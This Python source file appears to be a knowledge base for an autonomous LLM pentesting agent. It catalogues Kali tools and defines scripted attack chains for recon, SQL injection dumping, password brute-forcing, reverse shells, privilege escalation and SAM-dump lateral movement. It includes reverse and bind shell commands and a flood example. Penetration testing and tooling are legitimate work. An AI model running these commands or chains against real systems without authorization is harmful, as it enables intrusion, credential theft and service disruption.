"""
Kali Blueprint - Complete knowledge base of Kali Linux.

Every tool, path, config, service, and attack pattern mapped.
The agent uses this to know exactly what's available and how to use it.
"""

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set


@dataclass
class ToolInfo:
    """Complete information about a Kali tool."""
    name: str
    category: str
    description: str
    install_path: str
    binary: str
    usage: str
    examples: List[str]
    flags: Dict[str, str]
    depends_on: List[str] = field(default_factory=list)
    man_page: str = ""
    config_files: List[str] = field(default_factory=list)
    output_formats: List[str] = field(default_factory=list)


@dataclass
class ServiceInfo:
    """Information about a system service."""
    name: str
    port: int
    protocol: str
    config_path: str
    log_path: str
    start_cmd: str
    stop_cmd: str
    status_cmd: str
    description: str


@dataclass
class PathInfo:
    """Information about a filesystem path."""
    path: str
    description: str
    permissions: str
    owner: str
    contents: List[str] = field(default_factory=list)


class KaliBlueprint:
    """
    Complete knowledge base of Kali Linux.
    
    The agent uses this to:
    - Know every installed tool and how to use it
    - Navigate the filesystem
    - Understand service configurations
    - Chain tools together for complex attacks
    - Write custom scripts when needed
    """

    def __init__(self) -> None:
        self.tools: Dict[str, ToolInfo] = {}
        self.services: Dict[str, ServiceInfo] = {}
        self.paths: Dict[str, PathInfo] = {}
        self.tool_categories: Dict[str, List[str]] = {}
        self.attack_chains: Dict[str, List[str]] = {}
        self._build_blueprint()

    def _build_blueprint(self) -> None:
        """Build the complete Kali knowledge base."""
        self._register_recon_tools()
        self._register_web_tools()
        self._register_network_tools()
        self._register_exploitation_tools()
        self._register_forensics_tools()
        self._register_password_tools()
        self._register_wireless_tools()
        self._register_ReverseEngineeringTools()
        self._register_services()
        self._register_filesystem()
        self._register_attack_chains()

    # ── Reconnaissance Tools ────────────────────────────────────────────────

    def _register_recon_tools(self) -> None:
        tools = [
            ToolInfo(
                name="nmap",
                category="recon",
                description="Network exploration and security auditing",
                install_path="/usr/bin/nmap",
                binary="nmap",
                usage="nmap [options] <target>",
                examples=[
                    "nmap -sV -sC target.com",
                    "nmap -p- -T4 target.com",
                    "nmap -sU --top-ports 100 target.com",
                    "nmap -sn 192.168.1.0/24",
                    "nmap --script vuln target.com",
                    "nmap -O -A target.com",
                ],
                flags={
                    "-sV": "Service/version detection",
                    "-sC": "Default script scan",
                    "-p-": "All ports",
                    "-T4": "Aggressive timing",
                    "-sU": "UDP scan",
                    "-sn": "Ping scan (no port scan)",
                    "-O": "OS detection",
                    "-A": "Aggressive (OS, version, scripts, traceroute)",
                    "--script": "Run specific scripts",
                    "-oX": "Output XML",
                    "-oN": "Output normal",
                    "-oG": "Output grepable",
                },
                depends_on=["masscan"],
                man_page="nmap",
                output_formats=["normal", "xml", "grepable", "json"],
            ),
            ToolInfo(
                name="subfinder",
                category="recon",
                description="Passive subdomain enumeration",
                install_path="/usr/bin/subfinder",
                binary="subfinder",
                usage="subfinder -d <domain> [options]",
                examples=[
                    "subfinder -d example.com",
                    "subfinder -d example.com -o results.txt",
                    "subfinder -d example.com -recursive",
                    "subfinder -d example.com -all",
                ],
                flags={
                    "-d": "Domain to enumerate",
                    "-o": "Output file",
                    "-recursive": "Recursive enumeration",
                    "-all": "Use all sources",
                    "-silent": "Silent mode",
                },
                output_formats=["text", "json"],
            ),
            ToolInfo(
                name="amass",
                category="recon",
                description="In-depth attack surface mapping and asset discovery",
                install_path="/usr/bin/amass",
                binary="amass",
                usage="amass enum [options] -d <domain>",
                examples=[
                    "amass enum -d example.com",
                    "amass enum -passive -d example.com",
                    "amass enum -active -d example.com",
                    "amass enum -d example.com -o results.txt",
                ],
                flags={
                    "-d": "Domain",
                    "-passive": "Passive mode",
                    "-active": "Active mode",
                    "-brute": "Brute force subdomains",
                    "-o": "Output file",
                    "-timeout": "Query timeout",
                },
                output_formats=["text", "json", "graph"],
            ),
            ToolInfo(
                name="httpx",
                category="recon",
                description="Fast HTTP probing toolkit",
                install_path="/usr/bin/httpx",
                binary="httpx",
                usage="httpx [options]",
                examples=[
                    "cat domains.txt | httpx",
                    "httpx -l urls.txt -sc -title -tech-detect",
                    "httpx -u https://example.com -follow-redirects",
                ],
                flags={
                    "-l": "Input file",
                    "-sc": "Show status code",
                    "-title": "Show page title",
                    "-tech-detect": "Technology detection",
                    "-follow-redirects": "Follow redirects",
                    "-json": "JSON output",
                },
                output_formats=["text", "json", "csv"],
            ),
            ToolInfo(
                name="nuclei",
                category="recon",
                description="Fast vulnerability scanner based on templates",
                install_path="/usr/bin/nuclei",
                binary="nuclei",
                usage="nuclei [options] -u <target>",
                examples=[
                    "nuclei -u https://example.com",
                    "nuclei -l urls.txt -t cves/",
                    "nuclei -u https://example.com -severity critical,high",
                    "nuclei -u https://example.com -t technologies/",
                ],
                flags={
                    "-u": "Target URL",
                    "-l": "Target list",
                    "-t": "Template path",
                    "-severity": "Filter by severity",
                    "-tags": "Filter by tags",
                    "-json": "JSON output",
                    "-o": "Output file",
                },
                depends_on=["nuclei-templates"],
                output_formats=["text", "json", "csv", "sarif"],
            ),
            ToolInfo(
                name="theHarvester",
                category="recon",
                description="Email, subdomain, and name harvester",
                install_path="/usr/bin/theHarvester",
                binary="theHarvester",
                usage="theHarvester -d <domain> -b <source>",
                examples=[
                    "theHarvester -d example.com -b google",
                    "theHarvester -d example.com -b all -f report.html",
                ],
                flags={
                    "-d": "Domain",
                    "-b": "Source (google, bing, linkedin, etc.)",
                    "-f": "Output file",
                    "-l": "Limit results",
                },
            ),
            ToolInfo(
                name="katana",
                category="recon",
                description="Next-gen crawling and spidering framework",
                install_path="/usr/bin/katana",
                binary="katana",
                usage="katana [options] -u <url>",
                examples=[
                    "katana -u https://example.com",
                    "katana -u https://example.com -d 3 -jc",
                    "cat urls.txt | katana",
                ],
                flags={
                    "-u": "Target URL",
                    "-d": "Depth limit",
                    "-jc": "Execute JavaScript",
                    "-silent": "Silent mode",
                    "-o": "Output file",
                },
            ),
        ]
        self._add_tools(tools)

    # ── Web Exploitation Tools ──────────────────────────────────────────────

    def _register_web_tools(self) -> None:
        tools = [
            ToolInfo(
                name="sqlmap",
                category="web_exploit",
                description="Automatic SQL injection and database takeover",
                install_path="/usr/bin/sqlmap",
                binary="sqlmap",
                usage="sqlmap [options] -u <url>",
                examples=[
                    "sqlmap -u 'https://example.com/page?id=1' --dbs",
                    "sqlmap -u 'https://example.com/page?id=1' -D mydb --tables",
                    "sqlmap -r request.txt --batch --os-shell",
                    "sqlmap -u 'https://example.com/page?id=1' --dump-all",
                ],
                flags={
                    "-u": "Target URL",
                    "-r": "Request file",
                    "--dbs": "Enumerate databases",
                    "--tables": "Enumerate tables",
                    "--dump": "Dump table data",
                    "--os-shell": "Get OS shell",
                    "--batch": "Non-interactive mode",
                    "--level": "Level of tests (1-5)",
                    "--risk": "Risk of tests (1-3)",
                    "--tamper": "Use tamper script",
                },
                config_files=["/etc/sqlmap/"],
                output_formats=["text", "csv"],
            ),
            ToolInfo(
                name="ffuf",
                category="web_exploit",
                description="Fast web fuzzer",
                install_path="/usr/bin/ffuf",
                binary="ffuf",
                usage="ffuf [options] -u <url> -w <wordlist>",
                examples=[
                    "ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt",
                    "ffuf -u https://example.com/api/FUZZ -w wordlist.txt -mc 200",
                    "ffuf -u https://example.com -H 'Host: FUZZ.example.com' -w subdomains.txt",
                ],
                flags={
                    "-u": "Target URL (FUZZ placeholder)",
                    "-w": "Wordlist",
                    "-mc": "Match HTTP codes",
                    "-fs": "Filter by size",
                    "-fl": "Filter by line count",
                    "-H": "Custom header",
                    "-X": "HTTP method",
                    "-d": "POST data",
                    "-o": "Output file",
                    "-of": "Output format",
                },
                output_formats=["json", "ejson", "html", "md", "csv", "all"],
            ),
            ToolInfo(
                name="gobuster",
                category="web_exploit",
                description="Directory/DNS/VHost busting tool",
                install_path="/usr/bin/gobuster",
                binary="gobuster",
                usage="gobuster dir -u <url> -w <wordlist>",
                examples=[
                    "gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt",
                    "gobuster dns -d example.com -w subdomains.txt",
                    "gobuster vhost -u https://example.com -w vhosts.txt",
                ],
                flags={
                    "-u": "Target URL",
                    "-w": "Wordlist",
                    "-t": "Threads",
                    "-x": "Extensions",
                    "-s": "Status codes",
                    "--no-error": "Don't print errors",
                },
            ),
            ToolInfo(
                name="nikto",
                category="web_exploit",
                description="Web server scanner",
                install_path="/usr/bin/nikto",
                binary="nikto",
                usage="nikto -h <host>",
                examples=[
                    "nikto -h https://example.com",
                    "nikto -h https://example.com -o report.html",
                    "nikto -h https://example.com -Tuning 123b",
                ],
                flags={
                    "-h": "Target host",
                    "-o": "Output file",
                    "-Format": "Output format",
                    "-Tuning": "Test tuning",
                    "-Plugins": "Plugins to run",
                },
            ),
            ToolInfo(
                name="wpscan",
                category="web_exploit",
                description="WordPress security scanner",
                install_path="/usr/bin/wpscan",
                binary="wpscan",
                usage="wpscan --url <url> [options]",
                examples=[
                    "wpscan --url https://example.com",
                    "wpscan --url https://example.com --enumerate vp,vt,u",
                    "wpscan --url https://example.com --api-token TOKEN",
                ],
                flags={
                    "--url": "Target URL",
                    "--enumerate": "Enumeration options",
                    "--api-token": "WPScan API token",
                    "--detection-mode": "Detection mode",
                },
            ),
            ToolInfo(
                name="whatweb",
                category="web_exploit",
                description="Web technology identification",
                install_path="/usr/bin/whatweb",
                binary="whatweb",
                usage="whatweb <url>",
                examples=[
                    "whatweb https://example.com",
                    "whatweb -a 3 https://example.com",
                ],
                flags={
                    "-a": "Aggression level (1-4)",
                    "-v": "Verbose",
                    "--color": "Color output",
                },
            ),
            ToolInfo(
                name="wafw00f",
                category="web_exploit",
                description="Web Application Firewall fingerprinting",
                install_path="/usr/bin/wafw00f",
                binary="wafw00f",
                usage="wafw00f <url>",
                examples=[
                    "wafw00f https://example.com",
                    "wafw00f -a https://example.com",
                ],
                flags={
                    "-a": "Find all WAFs",
                    "-v": "Verbose",
                    "-p": "Use proxy",
                },
            ),
            ToolInfo(
                name="commix",
                category="web_exploit",
                description="Automated command injection exploitation",
                install_path="/usr/bin/commix",
                binary="commix",
                usage="commix [options] -u <url>",
                examples=[
                    "commix -u 'https://example.com/cmd.php?id=1'",
                    "commix -r request.txt --batch",
                ],
                flags={
                    "-u": "Target URL",
                    "-r": "Request file",
                    "--batch": "Non-interactive",
                    "--os-shell": "OS shell",
                    "--web-shell": "Web shell",
                },
            ),
            ToolInfo(
                name="xsstrike",
                category="web_exploit",
                description="XSS detection suite",
                install_path="/usr/bin/xsstrike",
                binary="xsstrike",
                usage="xsstrike [options] -u <url>",
                examples=[
                    "xsstrike -u 'https://example.com/search?q=test'",
                    "xsstrike -u 'https://example.com/search?q=test' --crawl",
                ],
                flags={
                    "-u": "Target URL",
                    "--crawl": "Crawl the target",
                    "--blind": "Blind XSS testing",
                    "--skip": "Skip DOM scanning",
                },
            ),
            ToolInfo(
                name="dalfox",
                category="web_exploit",
                description="Powerful XSS scanner and parameter analysis",
                install_path="/usr/bin/dalfox",
                binary="dalfox",
                usage="dalfox url <url> [options]",
                examples=[
                    "dalfox url 'https://example.com/search?q=test'",
                    "dalfox pipe < urls.txt",
                ],
                flags={
                    "url": "Target URL",
                    "pipe": "Read from stdin",
                    "-t": "Threads",
                    "--skip-mining-dom": "Skip DOM mining",
                },
            ),
        ]
        self._add_tools(tools)

    # ── Network Tools ───────────────────────────────────────────────────────

    def _register_network_tools(self) -> None:
        tools = [
            ToolInfo(
                name="netcat",
                category="network",
                description="TCP/UDP network utility",
                install_path="/usr/bin/nc",
                binary="nc",
                usage="nc [options] <host> <port>",
                examples=[
                    "nc -lvnp 4444",
                    "nc -e /bin/sh target.com 4444",
                    "nc -zv target.com 1-1000",
                    "nc -u target.com 53",
                ],
                flags={
                    "-l": "Listen mode",
                    "-v": "Verbose",
                    "-n": "No DNS",
                    "-p": "Port",
                    "-e": "Execute program",
                    "-z": "Zero-I/O mode",
                    "-u": "UDP mode",
                },
            ),
            ToolInfo(
                name="socat",
                category="network",
                description="Advanced relay for bidirectional data streams",
                install_path="/usr/bin/socat",
                binary="socat",
                usage="socat [options] <addr1> <addr2>",
                examples=[
                    "socat TCP-LISTEN:4444,fork EXEC:'/bin/sh'",
                    "socat - TCP:target.com:4444",
                ],
                flags={},
            ),
            ToolInfo(
                name="hping3",
                category="network",
                description="Active network smashing tool",
                install_path="/usr/bin/hping3",
                binary="hping3",
                usage="hping3 [options] <target>",
                examples=[
                    "hping3 -S target.com -p 80",
                    "hping3 --flood target.com",
                    "hping3 -1 target.com",
                ],
                flags={
                    "-S": "SYN flag",
                    "-p": "Port",
                    "--flood": "Flood mode",
                    "-1": "ICMP mode",
                    "-c": "Count",
                },
            ),
            ToolInfo(
                name="bettercap",
                category="network",
                description="Network attack and monitoring framework",
                install_path="/usr/bin/bettercap",
                binary="bettercap",
                usage="bettercap [options]",
                examples=[
                    "bettercap -iface eth0",
                    "bettercap -caplet http-proxy",
                ],
                flags={
                    "-iface": "Interface",
                    "-caplet": "Caplet to run",
                    "-eval": "Evaluation script",
                },
            ),
            ToolInfo(
                name="responder",
                category="network",
                description="LLMNR/NBT-NS/MDNS poisoner",
                install_path="/usr/bin/responder",
                binary="responder",
                usage="responder -I <interface> [options]",
                examples=[
                    "responder -I eth0 -wrf",
                    "responder -I eth0 --analyze",
                ],
                flags={
                    "-I": "Interface",
                    "-w": "WPAD",
                    "-r": "NBT-NS",
                    "-f": "Fingerprint",
                    "--analyze": "Analyze mode",
                },
            ),
            ToolInfo(
                name="enum4linux-ng",
                category="network",
                description="SMB/NetBIOS enumeration tool",
                install_path="/usr/bin/enum4linux-ng",
                binary="enum4linux-ng",
                usage="enum4linux-ng [options] <target>",
                examples=[
                    "enum4linux-ng -A target.com",
                    "enum4linux-ng -u user -p pass target.com",
                ],
                flags={
                    "-A": "All enumeration",
                    "-u": "Username",
                    "-p": "Password",
                },
            ),
        ]
        self._add_tools(tools)

    # ── Exploitation Tools ──────────────────────────────────────────────────

    def _register_exploitation_tools(self) -> None:
        tools = [
            ToolInfo(
                name="metasploit",
                category="exploitation",
                description="Penetration testing framework",
                install_path="/usr/bin/msfconsole",
                binary="msfconsole",
                usage="msfconsole [options]",
                examples=[
                    "msfconsole -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; run'",
                    "msfconsole -q -x 'search type:exploit platform:windows'",
                ],
                flags={
                    "-q": "Quiet mode",
                    "-x": "Execute commands",
                    "-r": "Resource file",
                },
                config_files=["/opt/metasploit/", "/usr/share/metasploit-framework/"],
            ),
            ToolInfo(
                name="searchsploit",
                category="exploitation",
                description="Exploit-DB search tool",
                install_path="/usr/bin/searchsploit",
                binary="searchsploit",
                usage="searchsploit [options] <term>",
                examples=[
                    "searchsploit apache 2.4.49",
                    "searchsploit -m 50383",
                    "searchsploit --nmap target.xml",
                ],
                flags={
                    "-m": "Mirror exploit",
                    "--nmap": "Search from nmap XML",
                    "-j": "JSON output",
                    "-c": "Count results",
                },
            ),
            ToolInfo(
                name="crackmapexec",
                category="exploitation",
                description="Network service exploitation tool",
                install_path="/usr/bin/crackmapexec",
                binary="crackmapexec",
                usage="crackmapexec <proto> <target> [options]",
                examples=[
                    "crackmapexec smb 192.168.1.0/24 -u admin -p password",
                    "crackmapexec ssh 192.168.1.1 -u root -p toor --ls",
                ],
                flags={
                    "-u": "Username",
                    "-p": "Password",
                    "--ls": "List files",
                    "--shares": "Enumerate shares",
                    "--sam": "Dump SAM",
                },
            ),
            ToolInfo(
                name="evil-winrm",
                category="exploitation",
                description="WinRM shell for Windows",
                install_path="/usr/bin/evil-winrm",
                binary="evil-winrm",
                usage="evil-winrm -i <ip> -u <user> -p <password>",
                examples=[
                    "evil-winrm -i 192.168.1.1 -u admin -p password",
                    "evil-winrm -i 192.168.1.1 -u admin -p password -s scripts/",
                ],
                flags={
                    "-i": "IP address",
                    "-u": "Username",
                    "-p": "Password",
                    "-s": "Scripts folder",
                    "-e": "Executable folder",
                },
            ),
            ToolInfo(
                name="pwntools",
                category="exploitation",
                description="CTF framework and exploit development library",
                install_path="/usr/lib/python3/dist-packages/pwnlib/",
                binary="pwn",
                usage="from pwn import *",
                examples=[
                    "pwn template ./binary > exploit.py",
                    "python3 -c 'from pwn import *; p=remote(\"target\",4444)'",
                ],
                flags={},
                depends_on=["python3"],
            ),
        ]
        self._add_tools(tools)

    # ── Password Attacks ────────────────────────────────────────────────────

    def _register_password_tools(self) -> None:
        tools = [
            ToolInfo(
                name="hashcat",
                category="password",
                description="Advanced password recovery utility",
                install_path="/usr/bin/hashcat",
                binary="hashcat",
                usage="hashcat [options] <hash> <wordlist>",
                examples=[
                    "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt",
                    "hashcat -m 1000 hash.txt -a 3 ?a?a?a?a?a?a",
                    "hashcat --show -m 0 hash.txt",
                ],
                flags={
                    "-m": "Hash type",
                    "-a": "Attack mode",
                    "--show": "Show cracked hashes",
                    "-o": "Output file",
                    "-w": "Workload profile",
                    "-S": "Slow candidates",
                },
                config_files=["/etc/hashcat/", "/usr/share/hashcat/"],
            ),
            ToolInfo(
                name="john",
                category="password",
                description="John the Ripper password cracker",
                install_path="/usr/bin/john",
                binary="john",
                usage="john [options] <hashfile>",
                examples=[
                    "john hash.txt",
                    "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
                    "john --show hash.txt",
                ],
                flags={
                    "--wordlist": "Wordlist mode",
                    "--show": "Show cracked",
                    "--format": "Hash format",
                    "--incremental": "Incremental mode",
                },
            ),
            ToolInfo(
                name="hydra",
                category="password",
                description="Fast network logon cracker",
                install_path="/usr/bin/hydra",
                binary="hydra",
                usage="hydra [options] <target> <service>",
                examples=[
                    "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1",
                    "hydra -l admin -P passwords.txt target.com http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'",
                ],
                flags={
                    "-l": "Login",
                    "-L": "Login list",
                    "-p": "Password",
                    "-P": "Password list",
                    "-t": "Threads",
                    "-v": "Verbose",
                    "-f": "Stop on first find",
                },
            ),
            ToolInfo(
                name="medusa",
                category="password",
                description="Fast, massively parallel network login brute-forcer",
                install_path="/usr/bin/medusa",
                binary="medusa",
                usage="medusa [options] -h <host> -u <user> -P <passfile>",
                examples=[
                    "medusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh",
                    "medusa -h target.com -U users.txt -P passwords.txt -M http",
                ],
                flags={
                    "-h": "Host",
                    "-u": "Username",
                    "-U": "Username file",
                    "-P": "Password file",
                    "-M": "Module",
                    "-t": "Threads",
                },
            ),
        ]
        self._add_tools(tools)

    # ── Forensics Tools ─────────────────────────────────────────────────────

    def _register_forensics_tools(self) -> None:
        tools = [
            ToolInfo(
                name="volatility3",
                category="forensics",
                description="Memory forensics framework",
                install_path="/usr/bin/vol",
                binary="vol",
                usage="vol -f <memory_dump> <plugin>",
                examples=[
                    "vol -f dump.raw windows.pslist",
                    "vol -f dump.raw windows.netscan",
                    "vol -f dump.raw windows.filescan",
                ],
                flags={
                    "-f": "Memory dump file",
                    "-o": "Output directory",
                },
            ),
            ToolInfo(
                name="binwalk",
                category="forensics",
                description="Firmware analysis tool",
                install_path="/usr/bin/binwalk",
                binary="binwalk",
                usage="binwalk [options] <file>",
                examples=[
                    "binwalk firmware.bin",
                    "binwalk -e firmware.bin",
                    "binwalk -M firmware.bin",
                ],
                flags={
                    "-e": "Extract",
                    "-M": "Recursive extraction",
                    "-t": "File type",
                },
            ),
            ToolInfo(
                name="yara",
                category="forensics",
                description="Pattern matching for malware identification",
                install_path="/usr/bin/yara",
                binary="yara",
                usage="yara [options] <rule_file> <target>",
                examples=[
                    "yara rules.yar malware.exe",
                    "yara -r rules/ suspicious/",
                ],
                flags={
                    "-r": "Recursive",
                    "-s": "Print strings",
                    "-m": "Print metadata",
                },
            ),
        ]
        self._add_tools(tools)

    # ── Wireless Tools ──────────────────────────────────────────────────────

    def _register_wireless_tools(self) -> None:
        tools = [
            ToolInfo(
                name="aircrack-ng",
                category="wireless",
                description="WiFi security auditing tools",
                install_path="/usr/bin/aircrack-ng",
                binary="aircrack-ng",
                usage="aircrack-ng [options] <capture file>",
                examples=[
                    "aircrack-ng -w wordlist.txt capture.cap",
                    "airodump-ng wlan0mon",
                    "aireplay-ng -0 10 -a AP_MAC -c CLIENT_MAC wlan0mon",
                ],
                flags={
                    "-w": "Wordlist",
                    "-b": "BSSID",
                    "-e": "ESSID",
                },
            ),
        ]
        self._add_tools(tools)

    # ── Reverse Engineering ─────────────────────────────────────────────────

    def _register_ReverseEngineeringTools(self) -> None:
        tools = [
            ToolInfo(
                name="ghidra",
                category="reverse_engineering",
                description="Software reverse engineering framework",
                install_path="/opt/ghidra/",
                binary="ghidra",
                usage="ghidra [options]",
                examples=["ghidra &"],
                flags={},
            ),
            ToolInfo(
                name="radare2",
                category="reverse_engineering",
                description="Reverse engineering framework",
                install_path="/usr/bin/r2",
                binary="r2",
                usage="r2 [options] <file>",
                examples=[
                    "r2 -A binary",
                    "r2 -q -c 'aaa;afl' binary",
                ],
                flags={
                    "-A": "Analyze",
                    "-q": "Quiet",
                    "-c": "Commands",
                },
            ),
            ToolInfo(
                name="objdump",
                category="reverse_engineering",
                description="Object file information display",
                install_path="/usr/bin/objdump",
                binary="objdump",
                usage="objdump [options] <file>",
                examples=[
                    "objdump -d binary",
                    "objdump -x binary",
                    "objdump -f binary",
                ],
                flags={
                    "-d": "Disassemble",
                    "-x": "All headers",
                    "-f": "File headers",
                },
            ),
            ToolInfo(
                name="strings",
                category="reverse_engineering",
                description="Find printable strings in files",
                install_path="/usr/bin/strings",
                binary="strings",
                usage="strings [options] <file>",
                examples=[
                    "strings binary",
                    "strings -n 6 binary",
                    "strings -e l binary",
                ],
                flags={
                    "-n": "Minimum length",
                    "-e": "Encoding (l=16bit, L=32bit)",
                },
            ),
        ]
        self._add_tools(tools)

    # ── System Services ─────────────────────────────────────────────────────

    def _register_services(self) -> None:
        self.services = {
            "ssh": ServiceInfo(
                name="sshd",
                port=22,
                protocol="tcp",
                config_path="/etc/ssh/sshd_config",
                log_path="/var/log/auth.log",
                start_cmd="systemctl start ssh",
                stop_cmd="systemctl stop ssh",
                status_cmd="systemctl status ssh",
                description="OpenSSH server",
            ),
            "apache": ServiceInfo(
                name="apache2",
                port=80,
                protocol="tcp",
                config_path="/etc/apache2/",
                log_path="/var/log/apache2/",
                start_cmd="systemctl start apache2",
                stop_cmd="systemctl stop apache2",
                status_cmd="systemctl status apache2",
                description="Apache HTTP server",
            ),
            "mysql": ServiceInfo(
                name="mysql",
                port=3306,
                protocol="tcp",
                config_path="/etc/mysql/",
                log_path="/var/log/mysql/",
                start_cmd="systemctl start mysql",
                stop_cmd="systemctl stop mysql",
                status_cmd="systemctl status mysql",
                description="MySQL database server",
            ),
            "postgresql": ServiceInfo(
                name="postgresql",
                port=5432,
                protocol="tcp",
                config_path="/etc/postgresql/",
                log_path="/var/log/postgresql/",
                start_cmd="systemctl start postgresql",
                stop_cmd="systemctl stop postgresql",
                status_cmd="systemctl status postgresql",
                description="PostgreSQL database server",
            ),
            "postgresql": ServiceInfo(
                name="postgresql",
                port=5432,
                protocol="tcp",
                config_path="/etc/postgresql/",
                log_path="/var/log/postgresql/",
                start_cmd="systemctl start postgresql",
                stop_cmd="systemctl stop postgresql",
                status_cmd="systemctl status postgresql",
                description="PostgreSQL database server",
            ),
            "smb": ServiceInfo(
                name="smbd",
                port=445,
                protocol="tcp",
                config_path="/etc/samba/smb.conf",
                log_path="/var/log/samba/",
                start_cmd="systemctl start smbd",
                stop_cmd="systemctl stop smbd",
                status_cmd="systemctl status smbd",
                description="SMB/CIFS file sharing",
            ),
        }

    # ── Filesystem Layout ───────────────────────────────────────────────────

    def _register_filesystem(self) -> None:
        self.paths = {
            "/usr/share/wordlists": PathInfo(
                path="/usr/share/wordlists",
                description="Password and directory wordlists",
                permissions="drwxr-xr-x",
                owner="root",
                contents=[
                    "rockyou.txt",
                    "dirb/",
                    "dirbuster/",
                    "fernwrj/",
                    "seclists/",
                ],
            ),
            "/usr/share/nmap/scripts": PathInfo(
                path="/usr/share/nmap/scripts",
                description="Nmap NSE scripts",
                permissions="drwxr-xr-x",
                owner="root",
                contents=["*.nse"],
            ),
            "/usr/share/metasploit-framework": PathInfo(
                path="/usr/share/metasploit-framework",
                description="Metasploit framework files",
                permissions="drwxr-xr-x",
                owner="root",
                contents=["modules/", "plugins/", "scripts/"],
            ),
            "/usr/share/nuclei-templates": PathInfo(
                path="/usr/share/nuclei-templates",
                description="Nuclei vulnerability templates",
                permissions="drwxr-xr-x",
                owner="root",
                contents=["cves/", "technologies/", "misconfigurations/"],
            ),
            "/etc/": PathInfo(
                path="/etc/",
                description="System configuration directory",
                permissions="drwxr-xr-x",
                owner="root",
                contents=["ssh/", "nginx/", "apache2/", "mysql/"],
            ),
            "/var/log": PathInfo(
                path="/var/log",
                description="System logs directory",
                permissions="drwxr-xr-x",
                owner="root",
                contents=["syslog", "auth.log", "kern.log", "apache2/"],
            ),
            "/opt": PathInfo(
                path="/opt",
                description="Optional software installation directory",
                permissions="drwxr-xr-x",
                owner="root",
                contents=["metasploit-framework/", "ghidra/"],
            ),
        }

    # ── Attack Chains ───────────────────────────────────────────────────────

    def _register_attack_chains(self) -> None:
        self.attack_chains = {
            "web_recon": [
                "subfinder -d {target} -o subs.txt",
                "httpx -l subs.txt -sc -title -tech-detect -o alive.txt",
                "nuclei -l alive.txt -severity critical,high -o vulns.txt",
                "ffuf -u https://FUZZ.{target} -w /usr/share/wordlists/dirb/common.txt -o dirs.txt",
            ],
            "sql_injection": [
                "sqlmap -u '{target_url}' --batch --dbs",
                "sqlmap -u '{target_url}' -D {db} --tables",
                "sqlmap -u '{target_url}' -D {db} -T {table} --dump",
            ],
            "credential_attack": [
                "hydra -l {user} -P /usr/share/wordlists/rockyou.txt ssh://{target}",
                "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{target}",
                "medusa -h {target} -u {user} -P /usr/share/wordlists/rockyou.txt -M ssh",
            ],
            "reverse_shell": [
                "msfconsole -q -x 'use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run'",
            ],
            "privilege_escalation": [
                "linpeas.sh -a > linpeas.txt",
                "linux-exploit-suggester.sh",
                "find / -perm -4000 -type f 2>/dev/null",
            ],
            "lateral_movement": [
                "crackmapexec smb {cidr} -u {user} -p {pass} --shares",
                "crackmapexec smb {cidr} -u {user} -p {pass} --sam",
                "evil-winrm -i {host} -u {user} -p {pass}",
            ],
        }

    # ── Helpers ─────────────────────────────────────────────────────────────

    def _add_tools(self, tools: List[ToolInfo]) -> None:
        for tool in tools:
            self.tools[tool.name] = tool
            if tool.category not in self.tool_categories:
                self.tool_categories[tool.category] = []
            self.tool_categories[tool.category].append(tool.name)

    def get_tool(self, name: str) -> Optional[ToolInfo]:
        return self.tools.get(name)

    def get_tools_by_category(self, category: str) -> List[ToolInfo]:
        names = self.tool_categories.get(category, [])
        return [self.tools[n] for n in names if n in self.tools]

    def get_attack_chain(self, chain_name: str) -> List[str]:
        return self.attack_chains.get(chain_name, [])

    def get_all_categories(self) -> List[str]:
        return sorted(self.tool_categories.keys())

    def get_service(self, name: str) -> Optional[ServiceInfo]:
        return self.services.get(name)

    def get_path_info(self, path: str) -> Optional[PathInfo]:
        return self.paths.get(path)

    def suggest_tools(self, task: str) -> List[str]:
        """Suggest tools based on task description."""
        task_lower = task.lower()
        suggestions = []

        keyword_map = {
            "scan": ["nmap", "masscan", "rustscan"],
            "port": ["nmap", "masscan"],
            "web": ["nuclei", "nikto", "whatweb", "ffuf", "gobuster"],
            "directory": ["ffuf", "gobuster", "dirb", "dirsearch"],
            "subdomain": ["subfinder", "amass", "assetfinder"],
            "sql": ["sqlmap"],
            "inject": ["sqlmap", "commix"],
            "xss": ["xsstrike", "dalfox"],
            "password": ["hashcat", "john", "hydra", "medusa"],
            "brute": ["hydra", "medusa", "ncrack"],
            "smb": ["enum4linux", "smbclient", "crackmapexec"],
            "ssh": ["hydra", "medusa", "ssh-audit"],
            "exploit": ["metasploit", "searchsploit"],
            "reverse": ["netcat", "socat", "msfconsole"],
            "shell": ["netcat", "socat", "msfconsole"],
            "privilege": ["linpeas", "linux-exploit-suggester"],
            "forensic": ["volatility", "binwalk", "yara"],
            "memory": ["volatility"],
            "firmware": ["binwalk"],
            "wifi": ["aircrack-ng"],
            "capture": ["wireshark", "tcpdump"],
            "sniff": ["wireshark", "tcpdump", "bettercap"],
            "spoof": ["bettercap", "responder"],
            "recon": ["subfinder", "amass", "httpx", "katana"],
            "enumerate": ["nmap", "enum4linux", "gobuster"],
            "dump": ["sqlmap", "hashcat", "john"],
            "crack": ["hashcat", "john"],
            "hash": ["hashcat", "john"],
        }

        for keyword, tool_list in keyword_map.items():
            if keyword in task_lower:
                suggestions.extend(tool_list)

        return list(dict.fromkeys(suggestions))

    def get_full_context(self) -> str:
        """Get the complete Kali knowledge base as context for the LLM."""
        lines = [
            "# KALI LINUX BLUEPRINT",
            "",
            "## Filesystem Layout",
        ]

        for path, info in self.paths.items():
            lines.append(f"  {path} - {info.description}")

        lines.extend(["", "## Installed Tools by Category"])

        for category in sorted(self.tool_categories.keys()):
            lines.append(f"\n### {category.upper()}")
            for tool_name in self.tool_categories[category]:
                tool = self.tools[tool_name]
                lines.append(f"  {tool.name}: {tool.description}")
                lines.append(f"    Usage: {tool.usage}")
                if tool.examples:
                    lines.append(f"    Example: {tool.examples[0]}")

        lines.extend(["", "## Services"])

        for name, svc in self.services.items():
            lines.append(f"  {name}: port {svc.port} ({svc.description})")

        lines.extend(["", "## Attack Chains"])

